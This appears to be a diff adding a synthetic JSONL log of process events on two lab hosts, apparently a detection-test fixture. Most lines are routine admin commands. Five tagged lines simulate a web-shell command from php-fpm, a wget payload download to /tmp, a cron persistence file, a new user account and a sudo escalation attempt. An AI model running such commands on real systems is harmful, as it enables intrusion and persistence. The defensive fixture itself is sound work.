@@ -1,0 +1,69 @@
+{"ts": "2026-10-07T01:00:15Z", "host": "lab-web01", "event": "process", "user": "adm-sato", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T01:01:50Z", "host": "lab-lnx01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T01:02:15Z", "host": "lab-web01", "event": "process", "user": "svc-deploy", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS -o /tmp/release.tar.gz https://deploy.lab.example/web/latest.tar.gz"}
+{"ts": "2026-10-07T01:03:54Z", "host": "lab-web01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T01:07:28Z", "host": "lab-lnx01", "event": "process", "user": "adm-sato", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T01:07:42Z", "host": "lab-lnx01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T01:07:59Z", "host": "lab-lnx01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T01:10:04Z", "host": "lab-web01", "event": "process", "user": "www-data", "image": "/usr/bin/dash", "parent": "php-fpm8.3", "cmdline": "sh -c id # px:W01"}
+{"ts": "2026-10-07T01:16:07Z", "host": "lab-lnx01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T01:18:30Z", "host": "lab-web01", "event": "process", "user": "www-data", "image": "/usr/bin/wget", "parent": "dash", "cmdline": "wget -q -O /tmp/px-w02.bin http://10.20.0.50/px-w02.bin # px:W02"}
+{"ts": "2026-10-07T01:19:17Z", "host": "lab-web01", "event": "process", "user": "adm-sato", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T01:19:48Z", "host": "lab-web01", "event": "process", "user": "adm-sato", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T01:22:36Z", "host": "lab-lnx01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T01:23:13Z", "host": "lab-web01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T01:26:12Z", "host": "lab-lnx01", "event": "process", "user": "root", "image": "/usr/bin/tee", "parent": "bash", "cmdline": "tee /etc/cron.d/pxjob-w03 # px:W03"}
+{"ts": "2026-10-07T01:26:12Z", "host": "lab-lnx01", "event": "file", "user": "root", "image": "/usr/bin/tee", "path": "/etc/cron.d/pxjob-w03", "cmdline": "tee /etc/cron.d/pxjob-w03 # px:W03"}
+{"ts": "2026-10-07T01:32:00Z", "host": "lab-lnx01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T01:34:50Z", "host": "lab-lnx01", "event": "process", "user": "root", "image": "/usr/sbin/useradd", "parent": "sudo", "cmdline": "useradd -m -c px:W04 pxuser-w04"}
+{"ts": "2026-10-07T01:38:32Z", "host": "lab-lnx01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T01:40:23Z", "host": "lab-web01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T01:41:21Z", "host": "lab-web01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T01:42:17Z", "host": "lab-lnx01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T01:43:05Z", "host": "lab-web01", "event": "process", "user": "www-data", "image": "/usr/bin/sudo", "parent": "dash", "cmdline": "sudo -n -i # px:W05"}
+{"ts": "2026-10-07T01:46:20Z", "host": "lab-web01", "event": "process", "user": "adm-sato", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T01:50:14Z", "host": "lab-web01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T01:53:56Z", "host": "lab-lnx01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T02:02:15Z", "host": "lab-web01", "event": "process", "user": "svc-deploy", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS -o /tmp/release.tar.gz https://deploy.lab.example/web/latest.tar.gz"}
+{"ts": "2026-10-07T02:03:00Z", "host": "lab-web01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T02:04:37Z", "host": "lab-web01", "event": "process", "user": "adm-sato", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T02:10:09Z", "host": "lab-lnx01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T02:16:37Z", "host": "lab-web01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T02:17:15Z", "host": "lab-lnx01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T02:17:54Z", "host": "lab-web01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T02:21:22Z", "host": "lab-lnx01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T02:22:12Z", "host": "lab-web01", "event": "process", "user": "adm-sato", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T02:33:06Z", "host": "lab-lnx01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T02:35:10Z", "host": "lab-web01", "event": "process", "user": "adm-sato", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T02:37:34Z", "host": "lab-lnx01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T02:37:59Z", "host": "lab-lnx01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T02:38:51Z", "host": "lab-web01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T02:53:27Z", "host": "lab-lnx01", "event": "process", "user": "adm-sato", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T02:55:43Z", "host": "lab-lnx01", "event": "process", "user": "adm-sato", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T02:59:54Z", "host": "lab-web01", "event": "process", "user": "adm-sato", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T03:02:15Z", "host": "lab-web01", "event": "process", "user": "svc-deploy", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS -o /tmp/release.tar.gz https://deploy.lab.example/web/latest.tar.gz"}
+{"ts": "2026-10-07T03:05:03Z", "host": "lab-lnx01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T03:07:45Z", "host": "lab-web01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T03:12:09Z", "host": "lab-web01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T03:12:58Z", "host": "lab-web01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T03:14:29Z", "host": "lab-lnx01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T03:17:46Z", "host": "lab-lnx01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T03:18:38Z", "host": "lab-web01", "event": "process", "user": "adm-sato", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T03:21:44Z", "host": "lab-web01", "event": "process", "user": "adm-sato", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T03:21:52Z", "host": "lab-web01", "event": "process", "user": "adm-sato", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T03:22:05Z", "host": "lab-web01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T03:22:11Z", "host": "lab-lnx01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T03:25:22Z", "host": "lab-web01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T03:27:46Z", "host": "lab-web01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T03:27:59Z", "host": "lab-lnx01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T03:29:12Z", "host": "lab-lnx01", "event": "process", "user": "adm-sato", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T03:34:17Z", "host": "lab-web01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T03:39:58Z", "host": "lab-lnx01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T03:47:07Z", "host": "lab-web01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T03:48:24Z", "host": "lab-lnx01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T03:48:32Z", "host": "lab-web01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T03:48:59Z", "host": "lab-web01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T03:50:27Z", "host": "lab-lnx01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/ls", "parent": "bash", "cmdline": "ls -la /var/log"}
+{"ts": "2026-10-07T03:50:56Z", "host": "lab-lnx01", "event": "process", "user": "adm-sato", "image": "/usr/bin/curl", "parent": "bash", "cmdline": "curl -fsS http://127.0.0.1/healthz"}
+{"ts": "2026-10-07T03:56:25Z", "host": "lab-web01", "event": "process", "user": "svc-monitor", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
+{"ts": "2026-10-07T03:58:34Z", "host": "lab-web01", "event": "process", "user": "adm-kimura", "image": "/usr/bin/df", "parent": "bash", "cmdline": "df -h"}
